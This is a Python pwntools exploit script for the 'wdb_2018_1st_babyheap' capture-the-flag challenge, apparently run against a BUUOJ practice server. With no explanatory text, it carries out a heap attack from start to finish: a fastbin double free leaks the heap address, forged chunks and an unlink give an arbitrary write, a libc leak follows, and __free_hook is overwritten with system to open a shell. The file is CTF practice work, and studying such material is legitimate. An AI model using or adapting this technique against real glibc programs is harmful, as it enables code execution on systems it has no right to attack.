#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/21 17:25:37
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = "amd64"
if debug:
    if context.arch == "amd64":
        # sh = process(["./wdb_2018_1st_babyheap"],env={'LD_PRELOAD':'../../libc_file/16-64-libc-2.23.so'})
        sh = process('./wdb_2018_1st_babyheap')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #libc = ELF("../../libc_file/16-64-libc-2.23.so")
    else:
        sh = process(["./wdb_2018_1st_babyheap"],env={'LD_PRELOAD':'../../libc_file/16-32-libc-2.23.so'})
        #sh = process("./")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc = ELF("../../libc_file/16-32-libc-2.23.so")
else:
    IP = 'node4.buuoj.cn'
    port = 28146
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
def debug():
    gdb.attach(sh)
    pause()

elf = ELF('wdb_2018_1st_babyheap')

def cmd(choice):
    sh.recvuntil("Choice:")
    sh.sendline(str(choice))

def add(idx,content):
    cmd(1)
    sh.recvuntil("Index:")
    sh.sendline(str(idx))
    sh.recvuntil("Content:")
    sh.send(content)

def edit(idx,content):
    cmd(2)
    sh.recvuntil("Index:")
    sh.sendline(str(idx))
    sh.recvuntil("Content:")
    sh.send(content)
def show(idx):
    cmd(3)
    sh.recvuntil("Index:")
    sh.sendline(str(idx))

def dele(idx):
    cmd(4)
    sh.recvuntil("Index:")
    sh.sendline(str(idx))

ptr = 0x602060

add(0,p64(0)+p64(0x31)+"\n")
add(1,"a\n")
add(2,"a\n")
add(3,"a\n")
add(4,"/bin/sh\x00\n")
dele(0)
dele(1)
dele(0)
show(0)
heap_addr = u64(sh.recv(4).ljust(8,"\x00")) - 0x30
log.info("heap_base=>{}".format(hex(heap_addr)))
edit(0,p64(heap_addr+0x10)+"\n")
add(5, p64(0) + p64(0x31) + p64(heap_addr) + p64(ptr-0x10))
# add(7,p64(0)+p64(0x21)+p64(0x20)+p64(0x90))
payload =  p64(ptr-0x18) + p64(ptr-0x10) + p64(0x20) + p64(0x90)
add(6,payload)
add(7,p64(0)+p64(0x20)+p64(ptr-0x18)+p64(ptr-0x10))
dele(1)
show(6)
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c4b78
log.info("libc_base=>{}".format(hex(libc_base)))
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
edit(0,p64(free_hook)*4)
edit(0,p64(system_addr)+"\n")
dele(4)
sh.interactive()